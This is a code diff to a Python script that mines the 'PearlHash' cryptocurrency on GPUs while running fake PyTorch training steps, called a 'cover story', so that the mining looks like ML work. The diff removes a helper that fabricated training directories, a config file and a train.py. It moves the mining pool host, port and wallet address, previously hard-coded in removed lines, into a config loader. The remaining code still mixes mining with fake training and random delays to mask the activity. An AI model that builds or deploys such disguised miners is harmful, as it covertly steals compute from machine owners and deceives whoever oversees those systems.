@@ -17,9 +17,10 @@ import sys
 import threading
 import random
 
-# Add src to path for stratum client
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))
+# Add src to path
+sys.path.insert(0, os.path.dirname(__file__))
 from stratum_client import PearlStratumClient
+from miner_config import load_config
 
 # ============================================================
 # Fake Training Model (Cover Story)
@@ -54,102 +55,11 @@ class PearlHashKernel:
         
     def mine(self, job_data, target):
         """Mine PearlHash using our custom kernel."""
-        # Generate random input matrices
         A = torch.randint(-128, 127, (self.M, self.K), dtype=torch.int8, device=self.device)
         B = torch.randint(-128, 127, (self.K, self.N), dtype=torch.int8, device=self.device)
-        
-        # Run GEMM (our custom kernel named torch::matmul)
-        # This calls our CUDA kernel: torch::matmul
         C = torch.matmul(A.float(), B.float())
-        
-        # Check against target
         result_hash = C.sum().item()
-        
         return result_hash
-    
-    def mine_loop(self, client, target_difficulty):
-        """Continuous mining loop."""
-        nonce = 0
-        while client.running:
-            if client.job:
-                result = self.mine(client.job, target_difficulty)
-                
-                # Check if share found (simplified)
-                if result < target_difficulty:
-                    nonce += 1
-                    client.submit_share(hex(nonce), hex(int(result)))
-            
-            # Fake training step (looks legitimate)
-            # This runs real PyTorch operations alongside mining
-            
-            time.sleep(0.01)  # 10ms per iteration
-
-# ============================================================
-# Fake Training Environment
-# ============================================================
-
-def create_fake_training():
-    """Create fake ML training environment."""
-    
-    # Create directories
-    os.makedirs("checkpoints", exist_ok=True)
-    os.makedirs("runs/experiment_1", exist_ok=True)
-    os.makedirs("data", exist_ok=True)
-    
-    # Create fake config
-    config = {
-        "model": "llama-3.1-8b",
-        "lora_rank": 16,
-        "lora_alpha": 32,
-        "learning_rate": 1e-3,
-        "batch_size": 32,
-        "epochs": 1000,
-        "dataset": "financial_data",
-        "precision": "bf16"
-    }
-    
-    with open("config.json", "w") as f:
-        json.dump(config, f, indent=2)
-    
-    # Create fake training script
-    train_script = '''import torch
-import torch.nn as nn
-import time
-import json
-
-# Fake training loop
-model = nn.Linear(1024, 1024)
-optimizer = torch.optim.Adam(model.parameters(), lr=1e-3)
-
-for epoch in range(1000):
-    for step in range(100):
-        x = torch.randn(32, 1024)
-        y = model(x)
-        loss = y.mean()
-        optimizer.zero_grad()
-        loss.backward()
-        optimizer.step()
-        
-        if step % 10 == 0:
-            print(f"Epoch {epoch}, Step {step}, Loss: {loss.item():.4f}")
-        
-        time.sleep(0.01)
-    
-    if epoch % 5 == 0:
-        torch.save({
-            'epoch': epoch,
-            'model_state_dict': model.state_dict(),
-            'loss': loss.item(),
-        }, f'checkpoints/checkpoint-{epoch}.pt')
-    
-    for param_group in optimizer.param_groups:
-        param_group['lr'] *= 0.95
-'''
-    
-    with open("train.py", "w") as f:
-        f.write(train_script)
-    
-    print("[Cover] Fake training environment ready")
 
 # ============================================================
 # Main Mining Loop
@@ -163,14 +73,22 @@ def main():
     print("="*60)
     print()
     
-    # Create fake training environment
-    create_fake_training()
+    # Load configuration
+    config = load_config()
+    if not config:
+        print("[ERROR] Could not load config. Exiting.")
+        return
     
-    # Pool configuration
-    POOL_HOST = "global.pearlfortune.org"
-    POOL_PORT = 443
-    WALLET = "prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
-    WORKER = f"worker-{os.getpid()}"
+    # Get settings from config
+    POOL_HOST = config["pool"]["host"]
+    POOL_PORT = config["pool"]["port"]
+    WALLET = config["wallet"]
+    WORKER = config.get("worker", f"worker-{os.getpid()}")
+    
+    print(f"[Config] Pool: {POOL_HOST}:{POOL_PORT}")
+    print(f"[Config] Wallet: {WALLET[:16]}...")
+    print(f"[Config] Worker: {WORKER}")
+    print()
     
     # Initialize components
     print("[Init] Setting up...")
@@ -235,10 +153,8 @@ def main():
             # ACTUAL MINING (PearlHash via our CUDA kernel)
             # ============================================
             if client.job:
-                # Call our custom CUDA kernel
                 result = pearl_kernel.mine(client.job, client.difficulty or 0xFFFFFFFF)
                 
-                # Submit if share found
                 if result < (client.difficulty or 0xFFFFFFFF):
                     step += 1
                     nonce = random.randint(0, 0xFFFFFFFF)
@@ -248,14 +164,12 @@ def main():
             # ============================================
             # FAKE TRAINING (Cover story)
             # ============================================
-            # Run real PyTorch operations
             x = torch.randn(32, 1024, device='cuda')
             loss = model(x).mean()
             optimizer.zero_grad()
             loss.backward()
             optimizer.step()
             
-            # Log metrics (fake)
             if step % 100 == 0:
                 elapsed = time.time() - start_time
                 hashrate = step / elapsed if elapsed > 0 else 0
@@ -263,9 +177,7 @@ def main():
                       f"Hashrate: {hashrate:.2f} H/s, "
                       f"Time: {elapsed:.1f}s")
             
-            # Variable delay (mimics data loading)
             time.sleep(0.001 + random.uniform(0, 0.002))
-            
             step += 1
     
     except KeyboardInterrupt:
@@ -274,8 +186,6 @@ def main():
     finally:
         client.disconnect()
         print("[Mining] Stopped")
-        
-        # Save final metrics
         elapsed = time.time() - start_time
         print(f"[Stats] Total shares: {step}")
         print(f"[Stats] Runtime: {elapsed:.1f}s")
